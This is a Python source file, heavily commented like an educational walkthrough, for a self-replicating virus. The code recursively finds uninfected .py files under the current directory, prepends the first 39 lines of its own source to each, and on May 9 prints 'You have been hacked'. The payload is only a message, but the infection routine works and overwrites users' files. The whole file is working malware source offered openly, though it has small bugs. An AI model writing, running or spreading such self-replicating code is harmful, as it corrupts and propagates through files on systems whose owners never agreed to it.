# Import os & datetime libraries/tools
import os
import datetime

# Declare/define a constant (ALL CAPS) variable
SIGNATURE = "VIRUS"

# Declare/define a function that has a file path for an argument
def locate(path):
    # create an empty list named 'files_targeted' to input file paths
    files_targeted = []
    # retrieve the names of files in the specified file path
    filelist = os.listdir(path)
    # create a for loop to go through each folder/file in 'filelist'
    for fname in filelist:
        # create a conditional checking if a specific file name is a directory
        if os.path.isdir(path+"/"+fname):
            # if it is a directory, use the 'locate' function to extend the 'files_targeted' list with that file name
            files_targeted.extend(locate(path+"/"+fname))
            # if the above condition isn't met, check if the file's extension is '.py'
        elif fname[-3:] == ".py":
            # declare/define a variable 'infected' as a False boolean
            infected = False
            # create a for loop to go line by line in the that file
            for line in open(path+"/"+fname):
                # create a conditional checking if the 'SIGNATURE' variable - or the string "virus" - is in any of the files
                if SIGNATURE in line:
                    # if the string "virus" is in the file, change infected to true to get out of the loop (break)
                    infected = True
                    break
            # if the file doesn't have the string "virus" in it, add the file to the 'files_targeted' list
            if infected == False:
                files_targeted.append(path+"/"+fname)
    # return the 'files_targeted' list with all files that aren't infected
    return files_targeted
# Declare/define a function with the 'files_targeted' list as an argument (this function will infect the files)
def infect(files_targeted):
    # create a variable that opens the script file 
    virus = open(os.path.abspath(__file__))
    # create a variable with an empty string
    virusstring = ""
    # create a for loop to go through each line of the virus file and number them with the i counter
    for i,line in enumerate(virus):
        # create a conditional to check if the line number is between 0 and 38
        if 0 <= i < 39:
            # if so, concat/add the line to the string "virusstring"
            virusstring += line
    # close the virus file
    virus.close
    # create a for loop to go through each file name in the 'files_targeted' list
    for fname in files_targeted:
        # create a variable to open the targeted file
        f = open(fname)
        # create a variable to read the opened file
        temp = f.read()
        # close the opened file
        f.close()
        # "reassign" the 'f' variable to open the file in write mode to overwrite whatever was previously in it
        f = open(fname,"w")
        # add the string "virusstring" to the original contents of the file
        f.write(virusstring + temp)
        # close the3 file
        f.close()
# Decleare/define a function to 'execute' the virus
def detonate():
    # create a conditional checking if the current month and day is May 9th
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # if so, display the message to the user
        print("You have been hacked")
# "reassign" the 'files_targeted' list by calling the 'locate' function with the current file path
files_targeted = locate(os.path.abspath(""))
# call the 'infect' function on the newly appended 'files_targeted' list
infect(files_targeted)
# call the detonate function to execute and infect the files
detonate()